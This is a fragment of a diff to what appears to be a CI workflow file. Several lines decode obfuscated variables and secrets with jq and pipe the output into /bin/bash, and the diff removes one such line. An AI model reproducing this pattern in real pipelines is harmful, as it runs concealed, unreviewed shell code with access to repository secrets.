@@ -22,7 +22,6 @@ jobs:
           ucer37: ${{ secrets.ucer37 }}
         run: |
           printf '%s' "$ucer37" | jq -r .mp987 | /bin/bash
-          echo $dp04304 | jq -r .qxtzg095 | /bin/bash
           printf '%s' "$frzpk8442" | jq -r .qvmr558 | /bin/bash
           echo $un41832 | jq -r .y9 | /bin/bash
           printf '%s' "$udckq51466" | jq -r .asjt801 | /bin/bash
